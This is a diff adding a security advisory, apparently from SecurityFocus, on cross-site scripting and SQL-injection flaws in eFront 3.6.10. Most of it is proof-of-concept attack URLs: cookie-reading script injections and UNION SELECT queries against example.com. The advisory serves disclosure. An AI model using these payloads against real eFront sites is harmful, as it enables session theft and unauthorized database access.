@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/50492/info
+
+eFront is prone to multiple cross-site scripting and SQL-injection vulnerabilities because the software fails to sufficiently sanitize user-supplied input.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+eFront 3.6.10 build 11944 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/index.php/%27%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/index.php?message=1&message_type=%22%20onmouseover=alert%28document.cookie%29%3E
+
+http://www.example.com/professor.php?ctg=%22%20onmouseover=%22alert%28document.cookie%29
+
+http://www.example.com/student.php?ctg=%22%20onmouseover=%22alert%28document.cookie%29
+
+Successful following exploit requires attacker to be registered and logged-in:
+
+http://www.example.com/view_test.php?done_test_id=1%20union%20select%201,2,%28select%20version%28%29%29,4,5,6,7,8,9,10, 11,12%20--%20
+
+Successful following exploits require that "magic_quotes_gpc" is off:
+
+http://www.example.com/view_test.php?test_id=1&user=%27SQL_CODE_HERE
+
+http://www.example.com/view_test.php?content_id=2&user=%27SQL_CODE_HERE
+
+http://www.example.com/modules/module_chat/admin.php?force=getLessonFromId&loglessonid=-1%27%20union%20select%20ver sion%28%29%20--%202
+
+http://www.example.com/ask_information.php?common_lessons=1&user1=professor&user2=%27%20union%20select%201,vers ion%28%29%20--%20
